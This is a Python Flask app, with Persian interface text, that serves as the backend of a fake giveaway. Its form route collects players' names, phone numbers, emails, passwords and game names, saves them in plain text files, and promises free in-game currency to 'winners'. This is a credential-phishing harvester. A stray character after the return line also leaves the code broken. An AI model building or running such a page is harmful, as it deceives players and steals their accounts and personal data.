from flask import Flask, render_template, request
import os
from datetime import datetime
from pathlib import Path
from werkzeug.utils import secure_filename

app = Flask(__name__)

DATA_DIR = Path(app.root_path) / "data"
DATA_DIR.mkdir(parents=True, exist_ok=True)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/submit', methods=['POST'])
def submit():
    fullname = request.form.get('fullname', '').strip()
    phone = request.form.get('phone', '').strip()
    company = request.form.get('company', '').strip()
    email = request.form.get('email', '').strip()
    password = request.form.get('password', '').strip()  # توصیه: رمزها را ذخیره نکن
    gamename = request.form.get('gamename', '').strip()

    timestamp = datetime.utcnow().strftime('%Y%m%d_%H%M%S')
    safe_email = secure_filename(email.replace('@', '_at_')) or "unknown"
    filename = f"{safe_email}_{timestamp}.txt"
    file_path = DATA_DIR / filename

    with file_path.open('w', encoding='utf-8') as f:
        f.write(f"نام کامل: {fullname}\n")
        f.write(f"شماره تلفن: {phone}\n")
        f.write(f"روش اتصال: {company}\n")
        f.write(f"ایمیل: {email}\n")
        f.write(f"رمز عبور: {password}\n")
        f.write(f"نام در بازی: {gamename}\n")

    return render_template('index.html', message="فرم شما با موفقیت ثبت گردید. در صورت انتخاب به‌عنوان فرد برنده، هدیه‌ای شامل ۱۶۰ سی‌پی رایگان به شما تعلق خواهد گرفت.")و

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)

